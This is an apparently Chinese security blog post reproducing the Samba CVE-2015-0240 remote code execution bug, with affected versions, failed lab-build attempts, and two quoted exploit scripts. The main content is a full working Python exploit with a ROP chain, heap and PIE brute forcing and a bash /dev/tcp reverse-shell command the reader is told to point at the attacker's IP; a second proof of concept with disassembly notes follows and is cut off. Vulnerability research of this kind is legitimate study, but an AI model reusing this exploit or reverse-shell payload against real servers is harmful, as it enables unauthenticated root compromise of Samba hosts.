

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="302">
  <meta name="keywords" content="">
  <title>Samba未初始化指针释放远程代码执行漏洞(CVE-2015-0240) - 302</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 4.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Doing's NOTE</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
		 style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
                Samba未初始化指针释放远程代码执行漏洞(CVE-2015-0240)
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-12-28 18:30" pubdate>
        2020年12月28日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.5k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      45
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">Samba未初始化指针释放远程代码执行漏洞(CVE-2015-0240)</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="Samba未初始化指针释放远程代码执行漏洞-CVE-2015-0240"><a href="#Samba未初始化指针释放远程代码执行漏洞-CVE-2015-0240" class="headerlink" title="Samba未初始化指针释放远程代码执行漏洞(CVE-2015-0240)"></a>Samba未初始化指针释放远程代码执行漏洞(CVE-2015-0240)</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。</p>
<p>Samba 3.5.0到4.2.0rc4版本的smbd文件服务程序存在一个远程代码执行漏洞，攻击者可以无需登录执行任意代码。</p>
<p>攻击者可以匿名与samba服务器建立空会话连接，然后调用ServerPasswordSet RPC接口，导致一个未初始化的栈指针被传给TALLOC_FREE()函数，通过发送特别构造的数据，可以控制该指针的内容，当该指针被释放时，攻击者可以以root身份执行任意代码。</p>
<p>Samba 4.1以及更高版本需要在服务器配置文件中设置“server schannel = yes”才能触发此漏洞。  </p>
<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p><strong>受影响系统：</strong></p>
<blockquote>
<p>Samba Samba 3.5.0 - 4.2.0rc4</p>
</blockquote>
<p><strong>不受影响系统：</strong></p>
<blockquote>
<p>Samba Samba 4.2.0rc5<br>Samba Samba 4.1.17<br>Samba Samba 4.0.25<br>Samba Samba 3.6.25</p>
</blockquote>
<h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><p>samba下载地址：<a href="https://download.samba.org/pub/samba/" target="_blank" rel="noopener">https://download.samba.org/pub/samba/</a></p>
<p>samba3.5.22</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker镜像：<a href="https://hub.docker.com/r/appcontainers/samba" target="_blank" rel="noopener">https://hub.docker.com/r/appcontainers/samba</a></p>
<p>运行容器：</p>
<pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>docker-virtual-machine:~# docker run -d -it --name samba -h samba -p <span class="hljs-number">138</span>:<span class="hljs-number">138</span>/udp -p <span class="hljs-number">139</span>:<span class="hljs-number">139</span> -p <span class="hljs-number">445</span>:<span class="hljs-number">445</span> -p <span class="hljs-number">445</span>:<span class="hljs-number">445</span>/udp registry.hub.docker.com/appcontainers/samba</code></pre>

<p>版本信息：</p>
<pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>samba /]# rpm -qa|grep samba
samba-common<span class="hljs-number">-3.6</span><span class="hljs-number">.23</span><span class="hljs-number">-51.</span>el6.x86_64
samba<span class="hljs-number">-3.6</span><span class="hljs-number">.23</span><span class="hljs-number">-51.</span>el6.x86_64
samba-winbind-clients<span class="hljs-number">-3.6</span><span class="hljs-number">.23</span><span class="hljs-number">-51.</span>el6.x86_64
samba-winbind<span class="hljs-number">-3.6</span><span class="hljs-number">.23</span><span class="hljs-number">-51.</span>el6.x86_64
samba-client<span class="hljs-number">-3.6</span><span class="hljs-number">.23</span><span class="hljs-number">-51.</span>el6.x86_64</code></pre>

<p>运行状态：</p>
<pre><code class="hljs routeros">[root@samba /]#<span class="hljs-built_in"> service smb </span>status
smbd (pid  99) is running<span class="hljs-built_in">..</span>.</code></pre>

<p>该版本可能不存在漏洞。</p>
<hr>
<p>安装smb</p>
<pre><code class="hljs angelscript">tar -xzvf samba<span class="hljs-number">-3.5</span><span class="hljs-number">.8</span>.tar.gz
cd samba<span class="hljs-number">-3.5</span><span class="hljs-number">.8</span>/source3
./<span class="hljs-built_in">auto</span>gen.sh</code></pre>

<blockquote>
<p>出现错误：need autoconf 2.53 or later to build samba from GIT …<br>解决方法：<br>curl -OL <a href="http://ftpmirror.gnu.org/autoconf/autoconf-2.69.tar.gz" target="_blank" rel="noopener">http://ftpmirror.gnu.org/autoconf/autoconf-2.69.tar.gz</a><br>tar -xzf autoconf-2.69.tar.gz<br>cd autoconf-2.69<br>./configure &amp;&amp; make &amp;&amp; sudo make install</p>
</blockquote>
<pre><code class="hljs jboss-cli"><span class="hljs-string">./autogen.sh</span>
<span class="hljs-string">./configure</span> <span class="hljs-params">--prefix=/usr/local/samba</span> <span class="hljs-params">--enable-socket-wrapper</span> <span class="hljs-params">--enable-nss-wrapper</span>
make</code></pre>

<p>编译出错：未解决</p>
<pre><code class="hljs pgsql">make: *** <span class="hljs-keyword">No</span> <span class="hljs-keyword">rule</span> <span class="hljs-keyword">to</span> make target `../client/mount.cifs.o<span class="hljs-string">', needed by `bin/mount.cifs'</span>.  Stop.</code></pre>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>EXP：<a href="http://blog.chaitin.com/samba_exploit_cve-2015-0240/samba-exploit.py" target="_blank" rel="noopener">http://blog.chaitin.com/samba_exploit_cve-2015-0240/samba-exploit.py</a></p>
<p>第一步：编辑samba.py 文件，编辑21行，将<strong>host</strong>改为目标靶机地址，</p>
<p>再将后面的 <strong>bash&gt;/dev/tcp/127.0.0.1</strong> 的ip地址修改为攻击机的ip</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span>

<span class="hljs-comment"># Author: kelwin@chaitin.com</span>

<span class="hljs-comment"># sudo apt-get install samba=2:3.6.3-2ubuntu2 samba-common=2:3.6.3-2ubuntu2 libwbclient0=2:3.6.3-2ubuntu2</span>

<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> signal
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># https://github.com/zTrix/zio</span>
<span class="hljs-keyword">from</span> zio <span class="hljs-keyword">import</span> *

<span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool, Manager

<span class="hljs-keyword">import</span> impacket
<span class="hljs-keyword">from</span> impacket.dcerpc.v5 <span class="hljs-keyword">import</span> transport, nrpc
<span class="hljs-keyword">from</span> impacket.dcerpc.v5.ndr <span class="hljs-keyword">import</span> NDRCALL
<span class="hljs-keyword">from</span> impacket.dcerpc.v5.dtypes <span class="hljs-keyword">import</span> *

host = <span class="hljs-string">'127.0.0.1'</span>
port = <span class="hljs-number">445</span>
cmd = <span class="hljs-string">"bash -c 'bash &gt;/dev/tcp/127.0.0.1/1337 0&lt;&amp;1 '\0"</span>
<span class="hljs-comment"># 0x0041e2cb: pop eax ; pop esi ; pop edi ; pop ebp ; ret ;</span>
pop4ret_o = <span class="hljs-number">0x41e2cb</span>
<span class="hljs-comment"># 0x000a6d7c: lea esp, dword [ecx-0x04] ; ret ;</span>
popebx_o = <span class="hljs-number">0x006fd522</span>
pivot_o = <span class="hljs-number">0xa6d7c</span>
got_o = <span class="hljs-number">0x9cd640</span>
fmt_o = <span class="hljs-number">0x8e043e</span>
system_o = <span class="hljs-number">0xa4250</span> 
snprintf_o = <span class="hljs-number">0xa3e20</span>
bss_o = <span class="hljs-number">0x9d5dc0</span>

pie = <span class="hljs-number">0x80000000</span>
free_addr = <span class="hljs-number">0x809fa10c</span> + <span class="hljs-number">8</span> + <span class="hljs-number">32</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span><span class="hljs-params">(free_addr, pie=<span class="hljs-number">0</span>, destructor=<span class="hljs-number">-1</span>, step=<span class="hljs-number">0x80</span>)</span>:</span>
    pivot = pie + pivot_o
    pop4ret = pie + pop4ret_o
    popebx = pie + popebx_o
    got = pie + got_o
    fmt = pie + fmt_o
    system = pie + system_o
    snprintf = pie + snprintf_o
    bss = pie + bss_o

    <span class="hljs-keyword">if</span> pie != <span class="hljs-number">0</span>:
        destructor = pivot
    <span class="hljs-comment"># struct talloc_chunk &#123;</span>
    <span class="hljs-comment">#     struct talloc_chunk *next, *prev;</span>
    <span class="hljs-comment">#     struct talloc_chunk *parent, *child;</span>
    <span class="hljs-comment">#     struct talloc_reference_handle *refs; // refs = 0</span>
    <span class="hljs-comment">#     talloc_destructor_t destructor; // destructor = -1: (No Crash), others: controled EIP</span>
    <span class="hljs-comment">#     const char *name;</span>
    <span class="hljs-comment">#     size_t size;</span>
    <span class="hljs-comment">#     unsigned flags; // magic</span>
    <span class="hljs-comment">#     void *poo</span>
    <span class="hljs-comment"># &#125;;</span>
    talloc_chunk = l32(<span class="hljs-number">0</span>)           <span class="hljs-comment"># refs =&gt; 0</span>
    talloc_chunk += l32(destructor) <span class="hljs-comment"># destructor =&gt; control EIP</span>
    talloc_chunk += l32(pop4ret)    <span class="hljs-comment"># pop4ret</span>
    talloc_chunk += <span class="hljs-string">'leet'</span>          <span class="hljs-comment">#</span>
    talloc_chunk += l32(<span class="hljs-number">0xe8150c70</span>) <span class="hljs-comment"># flags =&gt; magic</span>

    <span class="hljs-comment"># ebx =&gt; got</span>
    rop = l32(popebx) + l32(got)
    <span class="hljs-comment"># write cmd to bss</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(len(cmd)):
        c = cmd[i]
        rop += l32(snprintf) + l32(pop4ret)
        rop += l32(bss + i) + l32(<span class="hljs-number">2</span>) + l32(fmt) + l32(ord(c))
    <span class="hljs-comment"># system(cmd)</span>
    rop += l32(system) + <span class="hljs-string">'leet'</span> + l32(bss)

    payload = <span class="hljs-string">'deadbeef'</span>
    payload += talloc_chunk * <span class="hljs-number">0x1000</span> * step
    payload += <span class="hljs-string">'leet'</span> * <span class="hljs-number">2</span>
    payload += rop.ljust(<span class="hljs-number">2560</span>, <span class="hljs-string">'C'</span>)
    payload += <span class="hljs-string">'cafebabe'</span> + <span class="hljs-string">'\0'</span>

    username = <span class="hljs-string">''</span>
    password = <span class="hljs-string">''</span>

    <span class="hljs-comment">###</span>
    <span class="hljs-comment"># impacket does not implement NetrServerPasswordSet</span>
    <span class="hljs-comment">###</span>
    <span class="hljs-comment"># 3.5.4.4.6 NetrServerPasswordSet (Opnum 6)</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetrServerPasswordSet</span><span class="hljs-params">(NDRCALL)</span>:</span>
        opnum = <span class="hljs-number">6</span>
        structure = (
           (<span class="hljs-string">'PrimaryName'</span>,nrpc.PLOGONSRV_HANDLE),
           (<span class="hljs-string">'AccountName'</span>,WSTR),
           (<span class="hljs-string">'SecureChannelType'</span>,nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
           (<span class="hljs-string">'ComputerName'</span>,WSTR),
           (<span class="hljs-string">'Authenticator'</span>,nrpc.NETLOGON_AUTHENTICATOR),
           (<span class="hljs-string">'UasNewPassword'</span>,nrpc.ENCRYPTED_NT_OWF_PASSWORD),
        )

    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetrServerPasswordSetResponse</span><span class="hljs-params">(NDRCALL)</span>:</span>
        structure = (
           (<span class="hljs-string">'ReturnAuthenticator'</span>,nrpc.NETLOGON_AUTHENTICATOR),
           (<span class="hljs-string">'ErrorCode'</span>,NTSTATUS),
        )

    nrpc.OPNUMS[<span class="hljs-number">6</span>] = (NetrServerPasswordSet, NetrServerPasswordSetResponse)

    <span class="hljs-comment">###</span>
    <span class="hljs-comment"># connect to target</span>
    <span class="hljs-comment">###</span>
    rpctransport = transport.DCERPCTransportFactory(<span class="hljs-string">r'ncacn_np:%s[\PIPE\netlogon]'</span> % host)
    rpctransport.set_credentials(<span class="hljs-string">''</span>,<span class="hljs-string">''</span>)  <span class="hljs-comment"># NULL session</span>
    rpctransport.set_dport(port)
    <span class="hljs-comment"># impacket has a problem with SMB2 dialect against samba4</span>
    <span class="hljs-comment"># force to 'NT LM 0.12' only</span>
    rpctransport.preferred_dialect(<span class="hljs-string">'NT LM 0.12'</span>)

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)

    sessionKey = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">16</span>

    <span class="hljs-comment">###</span>
    <span class="hljs-comment"># prepare ServerPasswordSet request</span>
    <span class="hljs-comment">###</span>
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator[<span class="hljs-string">'Credential'</span>] = nrpc.ComputeNetlogonCredential(<span class="hljs-string">'12345678'</span>, sessionKey)
    authenticator[<span class="hljs-string">'Timestamp'</span>] = <span class="hljs-number">10</span>

    uasNewPass = nrpc.ENCRYPTED_NT_OWF_PASSWORD()
    uasNewPass[<span class="hljs-string">'Data'</span>] = payload

    primaryName = nrpc.PLOGONSRV_HANDLE()
    <span class="hljs-comment"># ReferentID field of PrimaryName controls the uninitialized value of creds in ubuntu 12.04 32bit</span>
    primaryName.fields[<span class="hljs-string">'ReferentID'</span>] = free_addr

    request = NetrServerPasswordSet()
    request[<span class="hljs-string">'PrimaryName'</span>] = primaryName
    request[<span class="hljs-string">'AccountName'</span>] = username + <span class="hljs-string">'\x00'</span>
    request[<span class="hljs-string">'SecureChannelType'</span>] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel
    request[<span class="hljs-string">'ComputerName'</span>] = host + <span class="hljs-string">'\x00'</span>
    request[<span class="hljs-string">'Authenticator'</span>] = authenticator
    request[<span class="hljs-string">'UasNewPassword'</span>] = uasNewPass

    DCERPCSessionError = nrpc.DCERPCSessionError
    <span class="hljs-keyword">try</span>:
        resp = dce.request(request)
        print(<span class="hljs-string">"no error !!! error code: 0xc0000225 or 0xc0000034 is expected"</span>)
        print(<span class="hljs-string">"seems not vulnerable"</span>)
        <span class="hljs-comment"># resp.dump()</span>
        dce.disconnect()
        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>
    <span class="hljs-keyword">except</span> DCERPCSessionError <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># expect error_code: 0xc0000225 - STATUS_NOT_FOUND</span>
        <span class="hljs-comment"># expect error_code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND</span>
        print(<span class="hljs-string">"seems not vulnerable"</span>)
        <span class="hljs-comment"># resp.dump()</span>
        dce.disconnect()
        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>
    <span class="hljs-keyword">except</span> impacket.nmb.NetBIOSError <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># print 'exception occured'</span>
        <span class="hljs-keyword">if</span> e.args[<span class="hljs-number">0</span>] == <span class="hljs-string">'Error while reading from remote'</span>:
            <span class="hljs-comment"># print("connection lost!!!\nmight be vulnerable")</span>
            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">raise</span>
    <span class="hljs-keyword">except</span> AttributeError:
        <span class="hljs-comment"># print("exception")</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_worker</span><span class="hljs-params">()</span>:</span>
    signal.signal(signal.SIGINT, signal.SIG_IGN)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess_heap</span><span class="hljs-params">(free_addr, step, hits)</span>:</span>
    <span class="hljs-keyword">if</span> len(hits) &gt; <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span>
    log(<span class="hljs-string">"[+] trying heap addr %s"</span> % hex(free_addr), <span class="hljs-string">'green'</span>)
    res = exploit(free_addr, destructor=<span class="hljs-number">-1</span>, step=step)
    <span class="hljs-keyword">if</span> res == <span class="hljs-number">0</span>:
        res = exploit(free_addr, destructor=<span class="hljs-number">0</span>, step=step)
        <span class="hljs-keyword">if</span> res != <span class="hljs-number">0</span>:
            log(<span class="hljs-string">"hit: %s"</span> % hex(free_addr), <span class="hljs-string">'red'</span>)
            hits.append(free_addr)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess_pie</span><span class="hljs-params">(free_addr, pie, step)</span>:</span>
    log(<span class="hljs-string">"[+] trying pie base addr %s"</span> % hex(pie), <span class="hljs-string">'green'</span>)
    <span class="hljs-keyword">try</span>:
        exploit(free_addr, pie=pie, step=step)
    <span class="hljs-keyword">except</span> impacket.nmb.NetBIOSTimeout:
        <span class="hljs-keyword">pass</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">brute_force_heap</span><span class="hljs-params">(step)</span>:</span>
    hit = <span class="hljs-literal">False</span>
    <span class="hljs-keyword">print</span> <span class="hljs-string">"Initializng 10 processes for brute forcing heap address..."</span>
    pool = Pool(<span class="hljs-number">10</span>, init_worker)
    manager = Manager()
    hits = manager.list()
    <span class="hljs-keyword">for</span> free_addr_base <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xb7700000</span>, <span class="hljs-number">0xba000000</span>, <span class="hljs-number">0x1000</span> * step * <span class="hljs-number">20</span>):
        <span class="hljs-keyword">for</span> offset <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">5</span>):
            pool.apply_async(guess_heap, (free_addr_base + offset * <span class="hljs-number">4</span>, step, hits))

    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            time.sleep(<span class="hljs-number">5</span>)
            <span class="hljs-keyword">if</span> len(hits) &gt; <span class="hljs-number">0</span>:
                pool.terminate()
                pool.join()
                <span class="hljs-keyword">return</span> hits[<span class="hljs-number">0</span>]

    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-keyword">print</span> <span class="hljs-string">"Caught KeyboardInterrupt, terminating..."</span>
        pool.terminate()
        pool.join()
        sys.exit(<span class="hljs-number">0</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">brute_force_pie</span><span class="hljs-params">(free_addr, step)</span>:</span>
    <span class="hljs-keyword">print</span> <span class="hljs-string">"Initializng 10 processes for brute forcing PIE base address..."</span>
    pool = Pool(<span class="hljs-number">10</span>, init_worker)
    <span class="hljs-keyword">for</span> pie <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xb6d00000</span>, <span class="hljs-number">0xb6f00000</span>, <span class="hljs-number">0x1000</span>):
        pool.apply_async(guess_pie, (free_addr, pie, step))

    <span class="hljs-keyword">try</span>:
        time.sleep(<span class="hljs-number">60</span> * <span class="hljs-number">60</span>)

    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-keyword">print</span> <span class="hljs-string">"Caught KeyboardInterrupt, terminating..."</span>
        pool.terminate()
        pool.join()

    <span class="hljs-keyword">else</span>:
        pool.close()
        pool.join()

step = <span class="hljs-number">0x1</span>
free_addr = brute_force_heap(step)
brute_force_pie(free_addr, step)</code></pre>

<p>安装包有点老，试了3.5.22和3.6.6版本的samba。漏洞环境安装编译出错，</p>
<blockquote>
<p>ldb_ldif.c:(.text+0xc17): undefined reference to `swrap_close’<br>collect2: ld returned 1 exit status<br>make: *** [bin/libnetapi.so.0] Error 1</p>
</blockquote>
<p>未解决。坑太多了，有点难搞。</p>
<p>POC：<a href="https://gist.github.com/worawit/33cc5534cb555a0b710b" target="_blank" rel="noopener">https://gist.github.com/worawit/33cc5534cb555a0b710b</a></p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span>
<span class="hljs-string">"""</span>
<span class="hljs-string">PoC for Samba vulnerabilty (CVE-2015-0240) by sleepya</span>
<span class="hljs-string">This PoC does only triggering the bug</span>
<span class="hljs-string">Reference:</span>
<span class="hljs-string">- https://securityblog.redhat.com/2015/02/23/samba-vulnerability-cve-2015-0240/</span>
<span class="hljs-string">#################</span>
<span class="hljs-string">Exploitability against CentOS/Ubuntu binaries</span>
<span class="hljs-string">#################</span>
<span class="hljs-string">Below are analysis result shown the 'creds' value will be on each platform.</span>
<span class="hljs-string">Only tracing binary on CentOS6 is explained how to find the uninitialized 'creds' data.</span>
<span class="hljs-string">CentOS6 x86 (samba 3.6.9):</span>
<span class="hljs-string">- 'creds' value is always 0x40 (computed from sizeof(struct netr_Authenticator))</span>
<span class="hljs-string">CentOS6 x64 (samba 3.6.9): (only look at assembly, no test)</span>
<span class="hljs-string">- 'creds' value is address in _talloc_zero() after call memset@plt (saved pc)</span>
<span class="hljs-string">Ubuntu 12.04 x86 (samba 3.6.3): (confirmed code execution)</span>
<span class="hljs-string">- 'creds' value is '_ptr_server_name' value in ndr_pull_netr_ServerPasswordSet() function</span>
<span class="hljs-string">Ubuntu 12.04 x64 (samba 3.6.3): (only look at assembly, no test)</span>
<span class="hljs-string">- 'creds' value is address in _talloc_zero() after call memset@plt (saved pc)</span>
<span class="hljs-string">Ubuntu 14.04 x86 (samba 4.1.6): (only look at assembly, no test)</span>
<span class="hljs-string">- 'creds' value is 'r' value in api_netr_ServerPasswordSet() function minus 0x30 ('struct talloc_chunk'  of 'r')</span>
<span class="hljs-string">Ubuntu 14.04 x64 (samba 4.1.6):</span>
<span class="hljs-string">- 'creds' value is 'r' value in api_netr_ServerPasswordSet() function</span>
<span class="hljs-string">Debian 7 x86 (samba 3.6.6): (confirmed code execution)</span>
<span class="hljs-string">- 'creds' value is '_ptr_server_name' value in ndr_pull_netr_ServerPasswordSet() function</span>
<span class="hljs-string">Debian 7 x64 (samba 3.6.6): (only look at assembly, no test)</span>
<span class="hljs-string">- 'creds' value is address in _talloc_zero() after call memset@plt (saved pc)</span>
<span class="hljs-string">(My) Conclusion:</span>
<span class="hljs-string">- code execution is possible on samba package of Ubuntu 12.04 x86 and Debian 7 x86</span>
<span class="hljs-string">- code execution might be possible (very difficult) on samba package of Ubuntu 14.04 x86</span>
<span class="hljs-string">#################</span>
<span class="hljs-string">Analysis of samba-3.6.9-164.el6.i686 on centos6</span>
<span class="hljs-string">#################</span>
<span class="hljs-string">The _netr_ServerPasswordSet() function is called from api_netr_ServerPasswordSet()</span>
<span class="hljs-string">function in "librpc/gen_ndr/srv_netlogon.c".</span>
<span class="hljs-string">When looking in to assembly (comparing to source code) of </span>
<span class="hljs-string">_netr_ServerPasswordSet function, the creds address is "ebp-0x1c".</span>
<span class="hljs-string">    00298c10 &lt;_netr_ServerPasswordSet&gt;:</span>
<span class="hljs-string">      298c10:       55                      push   %ebp</span>
<span class="hljs-string">      298c11:       89 e5                   mov    %esp,%ebp</span>
<span class="hljs-string">          ...</span>
<span class="hljs-string">      298c40:       e8 eb 30 e7 ff          call   10bd30 &lt;become_root&gt;</span>
<span class="hljs-string">          ...</span>
<span class="hljs-string">      298c4e:       8d 45 e4                lea    -0x1c(%ebp),%eax  ; creds address (ebp-0x1c, value is 0x40)</span>
<span class="hljs-string">      298c51:       89 44 24 10             mov    %eax,0x10(%esp)   ; pass creds to netr_creds_server_step_check()</span>
<span class="hljs-string">          ...</span>
<span class="hljs-string">      298c78:       e8 a3 cd ff ff          call   295a20 &lt;_netr_GetDcName+0x280&gt; ; netr_creds_server_step_check</span>
<span class="hljs-string">          ...</span>
<span class="hljs-string">      298c83:       e8 78 2f e7 ff          call   10bc00 &lt;unbecome_root&gt;</span>
<span class="hljs-string">Running the PoC against samba-3.6.9 on centos6 x86, the creds value in </span>
<span class="hljs-string">_netr_ServerPasswordSet() function is always 0x40. To tracking the uninitialized </span>
<span class="hljs-string">value of creds, I check the source in api_netr_ServerPasswordSet() function. </span>
<span class="hljs-string">I found the call to talloc_zero() function before calling to _netr_ServerPasswordSet()</span>
<span class="hljs-string">function.</span>
<span class="hljs-string">    r-&gt;out.return_authenticator = talloc_zero(r, struct netr_Authenticator);</span>
<span class="hljs-string">    if (r-&gt;out.return_authenticator == NULL) &#123;</span>
<span class="hljs-string">        talloc_free(r);</span>
<span class="hljs-string">        return false;</span>
<span class="hljs-string">    &#125;</span>
<span class="hljs-string">    r-&gt;out.result = _netr_ServerPasswordSet(p, r);</span>
<span class="hljs-string">I checked the assembly of _talloc_zero() function. The "ebp+0x1c" is set inside</span>
<span class="hljs-string">this function. After tracking define and use, the value at "ebp+0x1c" is computed</span>
<span class="hljs-string">from 2nd argument of _talloc_zero().</span>
<span class="hljs-string">    00004ae0 &lt;_talloc_zero&gt;:</span>
<span class="hljs-string">        4ae0:       55                      push   %ebp</span>
<span class="hljs-string">        4ae1:       89 e5                   mov    %esp,%ebp</span>
<span class="hljs-string">          ...</span>
<span class="hljs-string">        4afa:       8b 7d 0c                mov    0xc(%ebp),%edi  ; 2nd argument to edi</span>
<span class="hljs-string">          ...</span>
<span class="hljs-string">        4b41:       8d 77 3f                lea    0x3f(%edi),%esi</span>
<span class="hljs-string">        4b44:       83 e6 f0                and    $0xfffffff0,%esi</span>
<span class="hljs-string">        4b47:       89 75 e4                mov    %esi,-0x1c(%ebp) ; same stack address as creds</span>
<span class="hljs-string">The 2nd arguemnt of _talloc_zero() function is 'size'. The size value is </span>
<span class="hljs-string">sizeof(struct netr_Authenticator), which is 0xc bytes. That's why the uninitialized</span>
<span class="hljs-string">value of creds in _netr_ServerPasswordSet() function is always 0x40 on centos6.</span>
<span class="hljs-string">So code execution seems to be impossible for me on centos6 samba-3.6.9-164.el6.i686.</span>
<span class="hljs-string">#################</span>
<span class="hljs-string">"""</span>

<span class="hljs-keyword">import</span> sys

<span class="hljs-keyword">import</span> impacket
<span class="hljs-keyword">from</span> impacket.dcerpc.v5 <span class="hljs-keyword">import</span> transport, nrpc
